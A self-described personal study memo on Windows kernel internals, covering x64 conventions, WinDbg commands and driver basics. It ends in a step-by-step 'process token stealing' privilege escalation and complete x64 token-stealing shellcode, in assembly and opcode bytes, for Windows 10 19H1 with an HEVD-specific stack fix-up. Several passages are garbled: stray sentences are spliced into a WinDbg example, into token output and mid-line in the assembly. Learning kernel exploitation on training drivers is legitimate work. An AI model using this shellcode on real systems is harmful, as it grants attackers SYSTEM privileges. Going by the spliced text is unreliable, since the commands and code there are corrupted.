# Windows kernel journey - knowledges
1. [x64 software conventions](#x64-software-conventions)
2. [Windbg skill](#windbg-skill)
3. [Windows Drivers](#windows-drivers)
4. [Process token stealing](#process-token-stealing)

** ############### **

** Disclaimer **

** Why this memo ? It's just some notes / all information gathered during my "diving into the Windows kernel" journey. **

** I guess this note will only be reached by me but I put all my copy / paste skill to create this note. Links are provided for more details (including original authors) about each chapter **

** ############### **

## x64 software conventions
[Link](https://docs.microsoft.com/en-us/cpp/build/x64-software-conventions?view=vs-2019)

### Scalar types

It's recommended to align data on its natural boundary, or some multiple, to avoid performance loss.

### x64 calling convention

The x64 Application Binary Interface (ABI) uses a four-register fast-call calling convention by default. Integer arguments are passed in registers RCX, RDX, R8, and R9.

#### Alignment

Most structures are aligned to their natural alignment. The primary exceptions are the stack pointer and malloc or alloca memory, which are aligned to 16 bytes in order to aid performance. 

#### Parameter passing
The following table summarizes how parameters are passed:

   * Floating point | First 4 parameters - XMM0 through XMM3. Others passed on stack.
   * Integer | First 4 parameters - RCX, RDX, R8, R9. Others passed on stack.
   * Aggregates (8, 16, 32, or 64 bits) and __m64 	First 4 parameters - RCX, RDX, R8, R9. Others passed on stack.
   * Aggregates (other) 	By pointer. First 4 parameters passed as pointers in RCX, RDX, R8, and R9
   * __m128 	By pointer. First 4 parameters passed as pointers in RCX, RDX, R8, and R9

Example of argument passing 1 - all integers : 

    func1(int a, int b, int c, int d, int e);
    // a in RCX, b in RDX, c in R8, d in R9, e pushed on stack

#### x64 prolog and epilog

   * Prolog :

        mov    [RSP + 8], RCX
        push   R15
        push   R14
        push   R13
        sub    RSP, fixed-allocation-size
        lea    R13, 128[RSP]
        ...

If the fixed allocation size is greater than or equal to one page of memory :

        mov    [RSP + 8], RCX
        push   R15
        push   R14
        push   R13
        mov    RAX,  fixed-allocation-size
        call   __chkstk
        sub    RSP, RAX
        lea    R13, 128[RSP]
        ...

   * Epilog :

        lea      RSP, -128[R13] ; allocation size >= page of memory
        ; epilogue proper starts here
        add      RSP, fixed-allocation-size
        pop      R13
        pop      R14
        pop      R15
        ret
    
#### Stack allocation

The stack will always be maintained 16-byte aligned, except within the prolog (for example, after the return address is pushed), and except where indicated in Function Types for a certain class of frame functions.

## Windbg skill
[Link](https://web.archive.org/web/20170907000441/http://expdev-kiuhnm.rhcloud.com/2015/05/17/windbg/)
[Cheatsheet](https://github.com/hugsy/defcon_27_windbg_workshop/blob/master/windbg_cheatsheet.md)
### Help
   * Help, use

`.hh <command>`

### Enable printing Debug Strings

`ed nt!Kd_Default_Mask 8`


### Symbols

   * Turn on verbosity when loading symbols

`!sym noisy`

   * Symbols, if available, are loaded when needed. To see what modules have symbols loaded, use

`x *!`

`x kernel32!virtual*`

`x *!messagebox*`

   * Adding Symbols during Debugging

`.sympath+ c:\symbolpath`

`.reload`

### Modules
   * To list a specific module, say ntdll.dll, use

`lmf m ntdll `

   * To get the image header information of a module, say ntdll.dll, type

`!dh ntdll`

### Formats
   * Numbers are by default in base 16. To be explicit about the base used, add a prefix:

`0x123: base 16 (hexadecimal)`

`0n123: base 10 (decimal)`

`0t123: base 8 (octal)`

`0y111: base 2 (binary)`

   * Use the command .format to display a value in many formats:

`.formats 41`

      Hex:     00000000`00000041
      Decimal: 65
      Octal:   0000000000000000000101
      Binary:  00000000 00000000 00000000 00000000 00000000 00000000 00000000 01000001
      Chars:   .......A
      Time:    Thu Jan  1 01:01:05 1970
      Float:   low 9.10844e-044 high 0
      Double:  3.21143e-322

### Expressions
   * To evaluate an expression use ‘?‘:

`? eax+4`

### Breaks
#### Software Breakpoints

When you put a software breakpoint on one instruction, WinDbg saves to memory the first byte of the instruction and overwrites it with 0xCC which is the opcode for “int 3“.
When the “int 3” is executed, the breakpoint is triggered, the execution stops and WinDbg restores the instruction by restoring its first byte.

To put a software breakpoint on the instruction at the address 0x4110a0 type

`bp 4110a0`

You can also specify the number of passes required to activate the breakpoint (This means that the breakpoint will be ignored the first 2 times it’s encountered.) :

`bp 4110a0 3`

   * To break on a specific exception, use the command sxe. For instance, to break when a module is loaded, type :

`sxe ld <module name 1>,...,<module name N>`

   * To run until a certain address is reached (containing code), type

`g <code location>`

#### Hardware Breakpoints

Hardware breakpoints use specific registers of the CPU and are more versatile than software breakpoints. In fact, one can break on execution or on memory access.
Hardware breakpoints don’t modify any code so they can be used even with self modifying code. Unfortunately, you can’t set more than 4 breakpoints.

In its simplest form, the format of the command is

`ba <mode> <size> <address> <passes (default=1)>`

where `<mode>` can be

    'e' for execute
    'r' for read/write memory access
    'w' for write memory access

`<size>` specifies the size of the location, in bytes, to monitor for access (it’s always 1 when `<mode>` is 'e').
`<address>` is the location where to put the breakpoint and `<passes>` is the number of passes needed to activate the breakpoint.

Note: It’s not possible to use hardware breakpoints for a process before it has started because hardware breakpoints are set by modifying CPU registers (dr0, dr1, etc…) and when a process starts and its threads are created the registers are reset.

#### Handling Breakpoints
   * To list the breakpoints type

`bl`

      Example :
      0 e 77c6cb70     0002 (0002)  0:**** ntdll!CsrSetPriorityClass+0x40`

where the fields, from left to right, are as follows:

      0: breakpoint ID
      e: breakpoint status; can be (e)nabled or (d)isabled
      77c6cb70: memory address
      0002 (0002): the number of passes remaining before the activation, followed by the total number of passes to wait for the activation (i.e. the value specified when the breakpoint was created).
      0:****: the associated process and thread. The asterisks mean that the breakpoint is not thread-specific.
      ntdll!CsrSetPriorityClass+0x40: the module, function and offset where the breakpoint is located.

   * To disable a breakpoint type

`bd <breakpoint id>`

   * To delete a breakpoint use

`bc <breakpoint ID>`

   * Execute a certain command automatically every time a breakpoint is triggered

`bp jscript9+c2c47 ".printf \"new Array Data: addr = 0x%p\\n\",eax;g"`

#### Stepping
There are at least 3 types of stepping:

   * **step-in / trace** : this command breaks after every single instruction

`t`

   * **step-over** : this command breaks after every single instruction without following calls or ints

`p`

   * **step-out** : this command (go up) resume execution and breaks right after the next ret instruction. It’s used to exit functions.

`gu`

Here are the variants of ‘p‘ and ‘t‘:

    pa/ta <address>: step/trace to address
    pc/tc: step/trace to next call/int instruction
    pt/tt: step/trace to next ret (discussed above at point 3)
    pct/tct: step/trace to next call/int or ret
    ph/th: step/trace to next branching instruction

#### Displaying Memory

To display the contents of memory, you can use ‘d‘ or one of its variants:

    db: display bytes
    dw: display words (2 bytes)
    dd: display dwords (4 bytes)
    dq: display qwords (8 bytes)
    dyb: display bits
    da: display null-terminated ASCII strings
    du: display null-terminated Unicode strings

Type `.hh d` for seeing other variants.

#### Editing Memory

You can edit memory by using

`e[d|w|b] <address> [<new value 1> ... <new value N>]`

Here’s an example: This overwrites the first two dwords at the address in eip with the value 0xCC.

`ed eipWe are going to be looking for two things here.

Token (obviously)

ActiveProcessLinksWe are going to be looking for two things here.

Token (obviously)

ActiveProcessLinks cc cc`

#### Searching Memory

To search memory use the ‘s‘ command. Its format is:

`s [-d|-w|-b|-a|-u] <start address> L?<number of elements> <search values>`

Example: searches for the two consecutive dwords 0xcc 0xcc in the memory interval [eip, eip + 1000*4 – 1].

`s -d eip L?1000 cc cc`

#### Pointers

Sometimes you need to dereference a pointer. 

Example : poi(ebp+4) evaluates to the dword (or qword, if in 64-bit mode) at the address ebp+4. 

`dd poi(ebp+4)`

#### Miscellaneous Commands

To display the registers, type

`r`

To print the first 3 instructions pointed to by EIP ('u' = unassemble and 'L' = number of lines to display) use

`u EIP L3`

To display the call stack use

`k`

#### Suggested SETUP

Having 3 windows :

   * Disassembly : allows us to disassemble executable code into assembly language
   * Memory : allows us to view and analyze different sections of memory
   * Command : allows us to execute various WinDbg commands
   * Registers : allow us to easily view the contents of the CPU registers.
   * Call Stack : allows us to see maps where each region of execution will return to once it has completed.

Save the workspace (File→Save Workspace) after setting up the windows.

#### Find IRP
[Link](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-irpfind)
The !irpfind extension displays information about all I/O request packets (IRP) currently allocated in the target system

The following example produces a full listing of all IRPs in the nonpaged pool:

`kd> !irpfind` 

## Windows Drivers
[Link](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/)

### Overview of the Windows I/O Model
The I/O manager presents a consistent interface to all kernel-mode drivers, including lowest-level, intermediate, and file system drivers. 

All I/O requests to drivers are sent as I/O request packets (IRPs).

### Summary
The I/O manager creates a driver object for each driver that has been installed and loaded. Driver objects are defined using DRIVER_OBJECT structures.

![Texte alternatif](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/images/3devobj.png)

When the I/O manager calls a driver's DriverEntry routine, it supplies the address of the driver's driver object. The driver object contains storage for entry points to many of a driver's standard routines. 

### I/O Requests
[Link](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/example-i-o-request---an-overview)

##Process token stealing
### Principles
[Link](http://mcdermottcybersecurity.com/articles/x64-kernel-privilege-escalation)

First, find the hexadecimal address of the System process:

`kd> !process 0 0 System`

    PROCESS ffffda085c863300
    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
    DirBase: 001aa000  ObjectTable: ffffc58889403e40  HandleCount: 3395.
    Image: System

This points to an _EPROCESS structure with many fields which we can dump as follows:

`kd> dt _EPROCESS ffffda085c863300`

    nt!_EPROCESS
    +0x000 Pcb              : _KPROCESS
    [...]
    +0x360 Token            : _EX_FAST_REF

The token is a pointer-sized value located at offset 0x360 and we can dump the value as follows:

`kd> dq ffffda085c863300+0x360 L1`

    ffffda08``5c863660  ffffc588``89406047

The _EX_FAST_REF structure is a trick that relies on the assumption that kernel data structures are required to be aligned in memory on a 16-byte boundary. This means that a pointer to a token or any other kernel object will always have the last 4 bits set to zero.

`kd> dt _EX_FAST_REF`

    nt!_EX_FAST_REF
    +0x000 Object           : Ptr64 Void
    +0x000 RefCnt           : Pos 0, 4 Bits
    +0x000 Value            : Uint8B

To get the actual pointer from an _EX_FAST_REF, simply change the last hex digit to zero. To accomplish this programmatically, mask off the lowest 4 bits of the value with a logical-AND operation.

`kd> ? ffffc588``89406047 & ffffffff``fffffff0`

    Evaluate expression: -64284767788992 = ffffc588`89406040

We can display the token :

`kd> !token ffffc588``89406040`

        _TOKEN 0xffffc58889406040
        TS Session ID: 0
        User: S-1-5-18
        User Groups: 
         00 S-1-5-32-544
            Attributes - Default Enabled Owner 
         01 S-1-1-0
            Attributes - Mandatory DefaultWe can display the token Enabled 
         02 S-1-5-11
            Attributes - Mandatory Default Enabled 
         03 S-1-16-16384
            Attributes - GroupIntegrity GroupIntegrityEnabled 
        Primary Group: S-1-5-18
        Privs: 
         02 0x000000002 SeCreateTokenPrivilege            Attributes - 
         03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - 
         04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled Default 
         05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - 
         07 0x000000007 SeTcbPrivilege                    Attributes - Enabled Default 
         08 0x000000008 SeSecurityPrivilege               Attributes - 
         09 0x000000009 SeTakeOwnershipPrivilege          Attributes - 
         10 0x00000000a SeLoadDriverPrivilege             Attributes - 
         11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled Default 
         12 0x00000000c SeSystemtimePrivilege             Attributes - 
         13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled Default 
         14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default 
         15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled Default 
         16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled Default 
         17 0x000000011 SeBackupPrivilege                 Attributes - 
         18 0x000000012 SeRestorePrivilege                Attributes - 
         19 0x000000013 SeShutdownPrivilege               Attributes - 
         20 0x000000014 SeDebugPrivilege                  Attributes - Enabled Default 
         21 0x000000015 SeAuditPrivilege                  Attributes - Enabled Default 
         22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - 
         23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
         25 0x000000019 SeUndockPrivilege                 Attributes - 
         28 0x00000001c SeManageVolumePrivilege           Attributes - 
         29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled Default 
         30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default 
         31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - 
         32 0x000000020 SeRelabelPrivilege                Attributes - 
         33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default 
         34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled Default 
         35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default 
         36 0x000000024 SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled Default 
        Authentication ID:         (0,3e7)
        Impersonation Level:       Anonymous
        TokenType:                 Primary
        Source: *SYSTEM*           TokenFlags: 0x2000 ( Token in use )
        Token ID: 3eb              ParentToken ID: 0
        Modified ID:               (0, 3ec)
        RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
        OriginatingLogonSession: 0
        PackageSid: (null)
        CapabilityCount: 0      Capabilities: 0x0000000000000000
        LowboxNumberEntry: 0x0000000000000000
        Security Attributes:
        Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims
        Process Token TrustLevelSid: S-1-19-1024-8192

The next step is to locate the _EPROCESS structure for the cmd.exe process and replace the Token pointer at offset 0x360 with the address of the System token:

`kd> !process 0 0 cmd.exe`

    PROCESS ffffda08658c6400
    SessionId: 2  Cid: 1344    Peb: 0021d000  ParentCid: 0994
    DirBase: 367cc000  ObjectTable: ffffc588964d3180  HandleCount:  75.
    Image: cmd.exe

`kd> eq ffffda08658c6400+0x360 ffffc588``89406040`

### Get the current thread
[Link](https://connormcgarr.github.io/Kernel-Exploitation-1/)

The Kernel Processory Control Region (_KPCR) is managed by the kernel, for each logical processor present.

The Kernel Processor Region Control Block (_KPCRB) controls more granular information such as CPU model, type, current thread, etc.


The _KPCRB is at a 0x180 byte offset from _KPCR.

`kd> dt _KPCR`

     nt!_KPCR
     +0x000 NtTib            : _NT_TIB
     +0x000 GdtBase          : Ptr64 _KGDTENTRY64
     [...]
     +0x180 Prcb             : _KPRCB


The current thread object (_KTHREAD) is located 0x008 bytes away from _KPCRB :

`kd> dt _KPRCB`

    nt!_KPRCB
    +0x000 MxCsr            : Uint4B
    +0x004 LegacyNumber     : UChar
    +0x005 ReservedMustBeZero : UChar
    +0x006 InterruptRequest : UChar
    +0x007 IdleHalt         : UChar
    +0x008 CurrentThread    : Ptr64 _KTHREAD
    [...]

So, the current thread is located 0x188 total bytes away from _KPCR. 

Note : the "segment" registers (FS for x86 and GS for x64) allow us to access data structures, like the _KPCR.

This ASM code allows to get the current thread (KTHREAD) value into RAX :

    mov rax, [gs:0x188]

### Get the current process
[Link](https://connormcgarr.github.io/Kernel-Exploitation-1/)

After researching, one of the "childs" of _KTHREAD is known as _KAPC_STATE (offset 0x098). As we will find out, this is where _EPROCESS will ACTUALLY reside.

`kd> dt _KTHREAD`

    nt!_KTHREAD
    +0x000 Header           : _DISPATCHER_HEADER
    [...]
    +0x098 ApcState         : _KAPC_STATE

Let's look for that pointer to _EPROCESS (offset 0x020) within _KAPC_STATE :

`kd> dt _KAPC_STATE`

    nt!_KAPC_STATE
    +0x000 ApcListHead      : [2] _LIST_ENTRY
    +0x020 Process          : Ptr64 _KPROCESS
    +0x028 InProgressFlags  : UChar
    [...]


We gathered the associated process from the currently executed thread. This is because a process is associated with a thread. Offset of the process :

`kd> ? 0x020+0x098`

    Evaluate expression: 184 = 00000000`000000b8

This ASM code allows to get the current process (_EPROCESS) value into RAX :

    mov rax, [gs:0x188]
    mov rax, [rax + 0xb8]

### Get the token and ActiveProcessLinks
[Link](https://connormcgarr.github.io/Kernel-Exploitation-1/)

In the _EPROCESS, we are going to be looking for two things here.

* Token (which we want to replace by SYSTEM token)

* ActiveProcessLinks (a doubly linked list of the current processes)

Eventually the method is :

* cycle through ActiveProcessLinks, until we identify the actual SYSTEM process
* copy that SYSTEM token over to our process
* spawn cmd.exe from our current process

We can see ActiveProcessLinks at the offset 0x2f0 from _EPROCESS and token is at +0x360:

`kd> dt _EPROCESS`

    nt!_EPROCESS
    +0x000 Pcb              : _KPROCESS
    +0x2e0 ProcessLock      : _EX_PUSH_LOCK
    +0x2e8 UniqueProcessId  : Ptr64 Void
    +0x2f0 ActiveProcessLinks : _LIST_ENTRY
    +0x300 RundownProtect   : _EX_RUNDOWN_REF
    [...]
    +0x360 Token            : _EX_FAST_REF
    [...]

The ASM code which finds the E_PROCESS of SYSTEM (pid = 4) is like this one :

        mov rbx, rax			; copy _EPROCESS to rbx
        __findsystem:
        	mov rbx, [rbx + 0x2f0] 		; Get nt!_EPROCESS.ActiveProcessLinks.Flink
    	    sub rbx, 0x2f0      	   	; 
    	    mov rcx, [rbx + 0x2e8] 		; Get nt!_EPROCESS.UniqueProcessId (PID)
    	    cmp rcx, 4 			        ; Compare PID to SYSTEM PID 4
    	jnz __findsystem			    ; Loop until SYSTEM PID is found

### Steal the token and get SYSTEM
Then we replace the current process token with the SYSTEM token :

        mov rcx, [rbx + 0x360]        ; Get SYSTEM process nt!_EPROCESS.Token
        and cl, 0xf0			      ; Clear out _EX_FAST_REF RefCnt
        mov [rax + 0x360], rcx        ; Replace the token

Then we return :

        xor eax, eax                         ; Set NTSTATUS SUCCESS
        ret

### Final shellcode

Here is the shellcode for token stealing on Win10 version 10.0.18363 (19H1) :

#### ASM

[BITS 64]

_start:

    ; Notes :
    ; RAX will point onto the current process
    ; RBX will point onto SYSTEM process
    ; RCX will contain the SYSTEM token
    
    ; step 1 - get the current process (_EPROCESS) value into RAX :
    xor rax, rax
    mov rax, [gs:0x188]
    mov rax, [rax + 0xb8]

    ; step 2 - find the E_PROCESS of SYSTEM (pid = 4) and adjust RBX to point onto it :
    mov rbx, rax
    __findsystem:
        mov rbx, [rbx + 0x2f0] 		; Get nt!_EPROCESS.ActiveProcessLinks.Flink
        sub rbx, 0x2f0      	   	; 
        mov rcx, [rbx + 0x2e8] 		; Get nt!_EPROCESS.UniqueProcessId (PID)
        cmp rcx, 4 			        ; Compare PID to SYSTEM PID 4
    jnz __findsystem			    ; Loop until SYSTEM PID is found

    ; step 3 - replace the current process token with the SYSTEM token and return
    mov rcx, [rbx + 0x360]        ; Get SYSTEM process nt!_EPROCESS.Token
    and cl, 0xf0			      ; Clear out _EX_FAST_REF RefCnt
    mov [rax + 0x360], rcx        ; Replace the tokenHere is the shellcode for token stealing on Win10 version 10.0.18363 (19H1) :

    xor rax, rax                  ; Set NTSTATUS SUCCESS
    ret

#### opcodes 
    # step 1
    "\x48\x31\xC0"                         # xor rax, rax
    "\x65\x48\x8B\x04\x25\x88\x01\x00\x00" # mov rax, [gs:0x188]
    "\x48\x8B\x80\xB8\x00\x00\x00"         # mov rax, [rax + 0xb8]
    "\x48\x89\xC3"                         # mov rbx, rax
    # step 2 - __findsystem:
    "\x48\x8B\x9B\xF0\x02\x00\x00"         # mov rbx, [rbx + 0x2f0]
    "\x48\x81\xEB\xF0\x02\x00\x00"         # sub rbx, 0x2f0
    "\x48\x8B\x8B\xE8\x02\x00\x00"         # mov rcx, [rbx + 0x2e8]
    "\x48\x83\xF9\x04"                     # cmp rcx, 4
    "\x75\xE5"                             # jne __findsystem
    # step 3
    "\x48\x8B\x8B\x60\x03\x00\x00"         # mov rcx, [rbx + 0x360]
    "\x80\xE1\xF0"                         # and cl, 0xf0
    "\x48\x89\x88\x60\x03\x00\x00"         # mov [rax + 0x360], rcx
    "\x48\x83\xC4\x40"                     # add rsp, 0x40 ; RESTORE (Specific to HEVD)
    "\x48\x31\xC0"                         # xor rax, rax
    "\xC3"                                 # ret
